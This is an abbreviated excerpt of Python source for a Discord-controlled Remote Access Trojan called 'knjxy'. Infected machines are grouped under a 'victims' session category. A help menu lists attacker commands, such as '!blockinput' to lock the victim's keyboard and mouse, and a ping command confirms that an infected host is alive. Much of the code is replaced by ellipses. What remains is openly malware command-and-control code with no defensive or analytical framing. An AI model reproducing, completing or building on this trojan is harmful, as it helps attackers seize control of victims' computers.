...
SESSION_CATEGORY_NAME = "☠️ victims ☠️"
...
async def helpmenu(ctx):
    ...
    embed = discord.Embed(
        title="Remote Access Trojan (knjxy)\n",
    ...
    commands = (
        ...
        "`!blockinput`- block keyboard + mouse\n"
    ...
    embed.add_field(name=" **commands2:**", value=second_commands, inline=False)

    embed.add_field(name="\n**special commands:**", value=special_commands, inline=False)
...
@bot.command(name='ping', aliases=['alive'])
async def pinghost(ctx):
    ...
    await ctx.send("pong, host alive.")
